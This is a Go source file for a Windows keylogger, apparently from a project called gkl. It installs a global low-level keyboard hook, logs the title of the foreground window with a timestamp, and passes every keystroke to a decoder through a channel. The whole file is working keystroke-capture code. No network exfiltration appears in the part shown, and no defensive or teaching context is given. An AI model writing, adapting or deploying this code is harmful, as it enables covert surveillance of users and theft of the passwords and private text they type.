package keylogger

import (
	"fmt"
	"time"

	"github.com/Spriithy/gkl/user32"
	"github.com/Spriithy/gkl/wintypes"
)

type KeyLogger struct {
	Decoder            *KeyStrokeDecoder
	input              chan *KeyboardEvent
	previousWindowName string
}

func NewKeylogger(output chan string) *KeyLogger {
	kl := &KeyLogger{}
	kl.input = make(chan *KeyboardEvent)
	kl.Decoder = NewKeyStrokeDecoder(kl.input, output)
	return kl
}

func (kl *KeyLogger) Start() {
	user32.SetWindowsHookExW(wintypes.WH_KEYBOARD_LL, kl.hook, wintypes.NULL, 0)
	var msg wintypes.MSG
	for user32.GetMessageW(&msg, 0, 0, 0) != 0 {
	}
}

func (kl *KeyLogger) hook(nCode int, wParam wintypes.WPARAM, lParam wintypes.LPARAM) wintypes.LRESULT {
	hWnd := user32.GetForegroundWindow()
	threadId := user32.GetWindowThreadProcessId(hWnd, 0)
	layout := user32.GetKeyboardLayout(threadId)

	var bytes [256]byte
	user32.GetWindowTextA(hWnd, wintypes.LPCSTR(&bytes[0]), 256)
	windowName := string(bytes[:])

	if windowName != kl.previousWindowName {
		kl.previousWindowName = windowName
		fmt.Printf("%s - %s\n", time.Now().Local().String(), windowName)
	}

	kl.input <- NewKeyboardEvent(wParam, lParam, layout)
	return user32.CallNextHookEx(0, nCode, wParam, lParam)
}
